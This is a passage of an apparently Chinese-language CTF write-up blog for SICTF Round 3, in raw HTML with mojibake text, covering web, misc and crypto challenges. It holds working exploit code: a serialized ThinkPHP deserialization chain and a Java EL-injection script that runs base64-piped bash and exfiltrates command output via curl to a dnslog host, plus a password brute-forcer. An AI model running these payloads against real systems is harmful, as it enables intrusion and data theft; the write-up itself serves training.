class="string">&quot;TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url,data).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¾—åˆ°flagã€‚</p><p><img src="/./SICTF_Round3/w_5_1.png"></p><h2 id="è¿›é˜¶-elInjection"><a href="#è¿›é˜¶-elInjection" class="headerlink" title="[è¿›é˜¶]elInjection"></a>[è¿›é˜¶]elInjection</h2><p>é¢˜ç›®è¯´æ˜äº†æ˜¯elInjectionã€‚</p><p>å…ˆæµ‹è¯•ï¼Œè¾“å…¥<code>$&#123;null==null&#125;</code>ï¼Œå‘ç°èƒ½åŸæ ·è¾“å‡ºï¼Œè¾“å…¥<code>$&#123;null1==null&#125;</code>ï¼Œå‘ç°æŠ¥é”™äº†ï¼Œè¿™é‡ŒçŒœæµ‹ä»£ç èƒ½æ­£ç¡®æ‰§è¡Œå°±ä¼šè¿”å›è¾“å…¥çš„å€¼ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.mi1k7ea.com/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">ï¼ˆå…ˆçŸ¥é¦–å‘ï¼‰æµ…æELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´</a></p><p>â€‹<a href="https://j0k3r.top/2020/08/13/java-expression/#0x03-EL-%E6%B3%A8%E5%85%A5">Java EL ï¼ˆExpression Languageï¼‰è¡¨è¾¾å¼æ³¨å…¥</a></p><p>å› ä¸ºè¿‡æ»¤äº†<code>invoke</code>ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨åå°„æ¥ç»•ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“ç»•è¿‡ï¼Œä½†æ˜¯åè¾¹å‘ç°æ²¡èƒ½æ‰§è¡ŒæˆåŠŸï¼Œ<code>getRuntime</code> è¢«è¿‡æ»¤äº†ã€‚</p><p>é€šè¿‡ charAt ä¸ toChars è·å–å­—ç¬¦ï¼Œåœ¨ç”± toString è½¬å­—ç¬¦ä¸²å†ç”¨ concat æ‹¼æ¥æ¥ç»•è¿‡ä¸€äº›æ•æ„Ÿå­—ç¬¦çš„è¿‡æ»¤ã€‚</p><p>dnslogèƒ½å›æ˜¾ï¼Œé€šè¿‡dnslogå®ç°å¤–å¸¦</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">payload</span>):</span><br><span class="line">encode_payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload)):</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">encode_payload += <span class="string">&quot;true.toString().charAt(0).toChars(%d)[0].toString()&quot;</span> % <span class="built_in">ord</span>(payload[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">encode_payload += <span class="string">&quot;.concat(true.toString().charAt(0).toChars(%d)[0].toString())&quot;</span> % <span class="built_in">ord</span>(payload[i])</span><br><span class="line"><span class="keyword">return</span> encode_payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œå¡«å‘½ä»¤</span></span><br><span class="line">cmd = <span class="string">b&quot;curl `/readflag`.kbqsag.ceye.io&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(base64.b64encode(cmd))</span></span><br><span class="line"></span><br><span class="line">exp = <span class="string">&#x27;$&#123;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(%s)&#125;&#x27;</span> % (encode(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&quot;</span>+base64.b64encode(cmd).decode()+<span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;)&quot;</span>))</span><br><span class="line"><span class="comment">#print(exp)</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://yuanshen.life:23333/test&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;exp&#x27;</span>: exp&#125;</span><br><span class="line">r = requests.post(url, data).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä¸çŸ¥é“æœ‰<code>/readflag</code>ï¼Œç”¨grepæ‰¾æ ¹ç›®å½•æœ‰<code>f</code>çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = b&quot;curl `ls /|grep &#x27;f&#x27;`.kbqsag.ceye.io&quot;</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/w_6_1.png"></p><p>å¾—çŸ¥æœ‰ä¸€ä¸ª<code>readflag</code>ï¼Œè¿è¡Œå®ƒå³å¯å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = b&quot;curl `/readflag`.kbqsag.ceye.io&quot;</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/w_6_2.png"></p><p>æŠŠ<code>SICTF</code>å¤§å†™ï¼Œå‰©ä¸‹çš„å°å†™ï¼Œè¡¥ä¸Šå¤§æ‹¬å·å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;64177ed4-9254-dc2f-8d30-88aaef1b8264&#125;</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="GeekChallege"><a href="#GeekChallege" class="headerlink" title="GeekChallege"></a>GeekChallege</h2><p>çŒœå¯†ç ï¼Œè¿˜ä¸èƒ½æŒ‰å­—ç¬¦å…¨çŒœï¼Œå¾—ä¸€ä¸ªä¸€ä¸ªçŒœ</p><p>æŠŠå‡ºç°çš„å­—ç¬¦æ”¾åœ¨<code>dic</code>å‰é¢ï¼ŒåŠ å¿«é€Ÿåº¦ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;yuanshen.life&quot;</span>,<span class="number">34905</span>)</span><br><span class="line">dic=string.printable</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">pwd = <span class="string">&quot;&quot;</span></span><br><span class="line">pwdlen = <span class="number">113</span></span><br><span class="line">lst=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">114</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,pwd)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = pwd + j + <span class="string">&#x27;0&#x27;</span>*(pwdlen-<span class="built_in">len</span>(pwd))</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        a = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1&#x27;</span>*(<span class="built_in">len</span>(pwd)+<span class="number">1</span>) <span class="keyword">in</span> a:</span><br><span class="line">            <span class="built_in">print</span>(a)</span><br><span class="line">            <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                lst += j</span><br><span class="line">                dic = j + dic</span><br><span class="line">            pwd += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="çœŸğŸ’¨ç­¾åˆ°"><a href="#çœŸğŸ’¨ç­¾åˆ°" class="headerlink" title="çœŸğŸ’¨ç­¾åˆ°"></a>çœŸğŸ’¨ç­¾åˆ°</h2><p>zipå°¾ç«¯æœ‰ä¸€ä¸²å­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5456545454565458414259555854585458434152595958415a435959595558563d</span><br></pre></td></tr></table></figure><p>hexè§£ç åå¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TVTTTVTXABYUXTXTXCARYYXAZCYYYUXV=</span><br></pre></td></tr></table></figure><p>æ–‡æœ¬åŠ å¯†å­—æ¯è§£ç ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ã€‚</p><p>åœ¨çº¿ç½‘ç«™ï¼š<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu#:~:text=%E6%96%87%E6%9C%AC%E5%8A%A0%E5%AF%86%E4%B8%BA%E5%AD%97%E6%AF%8D%20%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81%20%E5%8A%A0%E5%AF%86,%EF%BC%9A%E6%96%87%E6%9C%AC%E6%A1%86%E8%BE%93%E5%85%A5%E5%8E%9F%E5%A7%8B%E6%96%87%E6%9C%AC%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81%E5%88%99%E5%9C%A8%E5%AF%86%E7%A0%81%E6%A1%86%E4%B8%AD%E8%AE%BE%E5%AE%9A%E4%B8%80%E4%B8%AA%E5%AF%86%E7%A0%81%EF%BC%8C%E7%82%B9%E5%87%BB%E5%8A%A0%E5%AF%86%E6%8C%89%E9%92%AE%EF%BC%8C%E4%B8%8B%E6%96%B9%E5%B0%86%E6%98%BE%E7%A4%BA%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E6%96%87%E6%9C%AC%E3%80%82%20%E8%A7%A3%E5%AF%86%20%EF%BC%9A%E6%96%87%E6%9C%AC%E6%A1%86%E8%BE%93%E5%85%A5%E5%8A%A0%E5%AF%86%E6%96%87%E6%9C%AC%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%AF%86%E7%A0%81%E5%88%99%E5%9C%A8%E5%AF%86%E7%A0%81%E6%A1%86%E4%B8%AD%E8%BE%93%E5%85%A5%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A0%81%EF%BC%8C%E7%82%B9%E5%87%BB%E8%A7%A3%E5%AF%86%E6%8C%89%E9%92%AE%EF%BC%8C%E4%B8%8B%E6%96%B9%E5%B0%86%E6%98%BE%E7%A4%BA%E8%A7%A3%E5%AF%86%E5%90%8E%E7%9A%84%E6%96%87%E6%9C%AC%E3%80%82">æ–‡æœ¬åŠ å¯†ä¸ºå­—æ¯</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024HappyNewYear</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/m_2_1.png"></p><p>è§£å‹ååˆ†æéŸ³é¢‘ï¼Œé™ä½é‡‡æ ·ç‡ï¼Œå¯ä»¥çœ‹åˆ°å¯†é’¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">givemeyourlagrange</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round3/m_2_2.png"></p><p>æœ€åæ˜¯éŸ³é¢‘çš„æ–‡ä»¶åï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LagrangeisCapatlized</span><br></pre></td></tr></table></figure><p>åˆ†ç¦»ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Lagrange is Capatlized</span><br></pre></td></tr></table></figure><p>æç¤ºå¾—åˆ°çš„å¯†é’¥ä¸­ <code>Lagrange</code> è¦å¤§å†™ã€‚ï¼ˆå‡ºé¢˜äººæŠŠ <code>Capatlized</code>å†™é”™äº†-_-!ï¼‰</p><p>æœ€ç»ˆå¯†é’¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">givemeyourLAGRANGE</span><br></pre></td></tr></table></figure><p><code>steghide</code>è§£jpgï¼Œå³å¯å¾—åˆ°flagã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;T3e_endless_Lagrange_is_really_fun!&#125;</span><br></pre></td></tr></table></figure><h2 id="WHO-WHO-WHO"><a href="#WHO-WHO-WHO" class="headerlink" title="WHO?WHO?WHO"></a>WHO?WHO?WHO</h2><p>ç”¨<code>rockyou.txt</code>å­—å…¸çˆ†ç ´å‹ç¼©åŒ…å¯†ç ï¼Œå¾—åˆ°å¯†ç ä¸º<code>qweqwe</code>ã€‚</p><p><img src="/./SICTF_Round3/m_3_1.png"></p><p>è§£å‹åå‘ç°å­—ç¬¦é•¿åº¦ä¸å¯¹ï¼ŒçŒœæµ‹é›¶å®½éšå†™ï¼Œæ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è§£äº†ã€‚</p><p>ç½‘ç«™ï¼š<a href="https://yuanfux.github.io/zero-width-web/"><strong>zero-width-lib</strong></a></p><p><img src="/./SICTF_Round3/m_3_2.png"></p><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U2FsdGVkX19uvldJ6CGUNff3B28QEdIjZqgUh98K+/0J16ELU8WVQydohw4P5+2MjbhTLQHNOpcoOd7kSRgy8pwpovCmimdD8M0IbYUeXjNKYePL/WP4PCMaOJHAW3HRb7IEoDDH1NYh3o5NwMmcFEqy1ujf72VgQIQkaeYFFFE=</span><br></pre></td></tr></table></figure><p>çŒœæµ‹æ˜¯<code>rabbit</code>åŠ å¯†ï¼Œå¯†é’¥çŒœæ˜¯<code>shumu</code>ï¼Œå‘ç°èƒ½è§£ã€‚</p><p>ç½‘ç«™ï¼š<a href="https://tool.oschina.net/encrypt/">åœ¨çº¿åŠ å¯†è§£å¯†(é‡‡ç”¨å®ç°)</a></p><p><img src="/./SICTF_Round3/m_3_3.png"></p><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT&#125;</span><br></pre></td></tr></table></figure><p>DNAåŠ å¯†ï¼Œå»æ‰¾ä¸ªè„šæœ¬ä¿®æ”¹ä¸€ä¸‹</p><p>ç½‘ç«™ï¼š<a href="https://github.com/karma9874/DNA-Cipher-Script-CTF">DNA-Cipher-Script-CTF</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">mapping = &#123;</span><br><span class="line">        <span class="string">&#x27;AAA&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;AAC&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;AAG&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;AAT&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;ACA&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;ACC&#x27;</span>:<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;ACG&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;ACT&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;AGA&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;AGC&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;AGG&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;AGT&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;ATA&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;ATC&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;ATG&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;ATT&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;CAA&#x27;</span>:<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;CAC&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;CAG&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;CAT&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;CCA&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;CCC&#x27;</span>:<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;CCG&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;CCT&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;CGA&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;CGC&#x27;</span>:<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;CGG&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;CGT&#x27;</span>:<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;CTA&#x27;</span>:<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;CTC&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;CTG&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;CTT&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;GAA&#x27;</span>:<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;GAC&#x27;</span>:<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;GAG&#x27;</span>:<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;GAT&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;GCA&#x27;</span>:<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;GCC&#x27;</span>:<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;GCG&#x27;</span>:<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;GCT&#x27;</span>:<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;GGA&#x27;</span>:<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;GGC&#x27;</span>:<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;GGG&#x27;</span>:<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;GGT&#x27;</span>:<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;GTA&#x27;</span>:<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;GTC&#x27;</span>:<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;GTG&#x27;</span>:<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;GTT&#x27;</span>:<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;TAA&#x27;</span>:<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;TAC&#x27;</span>:<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;TAG&#x27;</span>:<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;TAT&#x27;</span>:<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;TCA&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;TCC&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;TCG&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;TCT&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;TGA&#x27;</span>:<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;TGC&#x27;</span>:<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;TGG&#x27;</span>:<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;TGT&#x27;</span>:<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;TTA&#x27;</span>:<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;TTC&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;TTG&#x27;</span>:<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;TTT&#x27;</span>:<span class="string">&#x27;.&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_dna</span>(<span class="params">string</span>):</span><br><span class="line">    final=<span class="string">&quot;&quot;</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;<span class="built_in">len</span>(string):</span><br><span class="line">        final+=mapping[string[i:i+<span class="number">3</span>]]</span><br><span class="line">        i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> string[i]==<span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> string[i]==<span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> string[i]==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            final+=string[i]</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line">input_string = <span class="string">&quot;GTAGAGCTAGTCCTT&#123;GGGTCACGGTTC_GGGTCACGGTTC_GAACGGTTC_GTAGTG_GCTTCA_GTAGACGTGGCGGTG_GTAGACTCA_TATGACCGG_GCTCGGGCT&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = decode_dna(input_string)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">datas = [input_string.split(&#x27;&#123;&#x27;)[0]]+input_string.split(&#x27;&#123;&#x27;)[1][:-1].split(&#x27;_&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag=&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in datas:</span></span><br><span class="line"><span class="string">    flag+=decode_dna(i)+&#x27;_&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SICTF&#123;Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN&#125;</span></span><br></pre></td></tr></table></figure><h2 id="æ—¥å¿—åˆ†æ2"><a href="#æ—¥å¿—åˆ†æ2" class="headerlink" title="æ—¥å¿—åˆ†æ2"></a>æ—¥å¿—åˆ†æ2</h2><p>ipåœ°å€åœ¨<code>error.log1</code>é‡Œèƒ½å‘ç°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.11.35.95</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿ<code>access.log.1</code>ï¼Œåœ¨loginçš„æ—¶å€™æœ‰å¤§é‡é‡å¤è¯·æ±‚å‘ç°ï¼Œåº”è¯¥æ˜¯åœ¨çˆ†ç ´å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æš´åŠ›ç ´è§£</span><br></pre></td></tr></table></figure><p>æœç´¢<code>sql</code>ï¼Œå¯ä»¥çœ‹åˆ°sqlmapå’Œå®ƒçš„ç‰ˆæœ¬å·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap 1.2.4.18</span><br></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªæ˜¯çŒœç”¨äº†èšå‰‘ï¼Œæœ<code>ant</code>ï¼Œæœç„¶æ˜¯èšå‰‘ï¼Œå¾—åˆ°åç§°å’Œç‰ˆæœ¬å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">antSword/v2.1</span><br></pre></td></tr></table></figure><p>æœ€åçš„flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SICTF&#123;10.11.35.95|æš´åŠ›ç ´è§£|sqlmap|1.2.4.18|èšå‰‘|2.1&#125;</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="ç­¾åˆ°-Vigenere"><a href="#ç­¾åˆ°-Vigenere" class="headerlink" title="[ç­¾åˆ°]Vigenere"></a>[ç­¾åˆ°]Vigenere</h2><p>åœ¨çº¿ç½‘ç«™çˆ†ç ´å³å¯</p><p>åœ¨çº¿ç½‘ç«™ï¼š<a href="https://www.guballa.de/vigenere-solver">VigenÃ¨re Solver</a></p><p><img src="/./SICTF_Round3/c_1_1.png"></p><h2 id="SuperbRSA"><a href="#SuperbRSA" class="headerlink" title="SuperbRSA"></a>SuperbRSA</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#user:mumu666</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e1=<span class="number">55</span></span><br><span class="line">e2=<span class="number">200</span></span><br><span class="line">m=bytes_to_long(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">pow</span>(m,<span class="number">5</span>) &lt; n)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2)</span><br><span class="line"></span><br><span class="line">n= <span class="number">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></span><br><span class="line">c1= <span class="number">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></span><br><span class="line">c2= <span class="number">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…±æ¨¡æ”»å‡»ï¼Œè§£å‡ºmåå¼€5æ¬¡æ–¹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n= <span class="number">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></span><br><span class="line">c1= <span 